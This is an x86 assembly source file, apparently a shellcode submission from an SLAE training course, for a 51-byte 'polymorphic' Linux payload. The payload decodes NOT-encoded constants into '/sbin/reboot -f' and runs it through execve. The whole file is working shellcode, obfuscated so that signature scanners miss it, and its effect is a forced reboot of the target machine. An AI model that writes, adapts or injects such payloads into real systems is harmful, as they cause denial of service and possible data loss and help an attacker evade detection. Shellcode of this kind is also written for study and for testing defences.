; Title: Linux/x86 Force Reboot shellcode for Linux/x86 - Polymorphic 
; Author: h4pp1n3ss
; Tested on: Linux 4.18.0-25-generic #26 Ubuntu
; Size: 51 bytes
; SLAE ID: PA-9844

SECTION .data

         SYSCALL_EXECVE equ 11

SECTION .text

global _start

_start:
        nop
        or eax, 0xffffffff
        not eax
        push eax


        mov eax, 0x8b90909d
        not eax
        push eax

        mov eax, 0x9a8dd091
        not eax
        push eax

        mov eax, 0x969d8cd0
        not eax
        push eax
        
        xor eax, eax
        mov ebx, esp
        push eax
        push word  0x662d
        mov  esi, esp
        push eax
        push esi
        push ebx
        mov  ecx, esp
        or   al, SYSCALL_EXECVE
        int  0x80